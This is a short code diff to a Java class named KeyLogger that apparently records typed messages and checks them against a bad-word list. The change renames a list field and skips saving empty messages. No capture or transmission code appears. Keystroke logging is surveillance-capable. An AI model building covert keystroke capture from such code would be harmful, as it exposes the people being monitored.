@@ -19,7 +19,7 @@ public abstract class KeyLogger {
 
     public static InputStream badWordsFilePath = ClassLoader.getSystemResourceAsStream("BadWords.csv");
     public static ArrayList<String> log = new ArrayList<>();
-    public static ArrayList<String> debugLog = new ArrayList<>();
+    public static ArrayList<String> ignoredWords = new ArrayList<>();
     static String baseMessage;
     static String message;
     String sendKey;
@@ -37,7 +37,9 @@ public abstract class KeyLogger {
 
 
     void saveMessage() {
-        log.add(baseMessage + message + "\n");
+        if(message.length() > 0) {
+            log.add(baseMessage + message + "\n");
+        }
         setDefaults();
     }
 
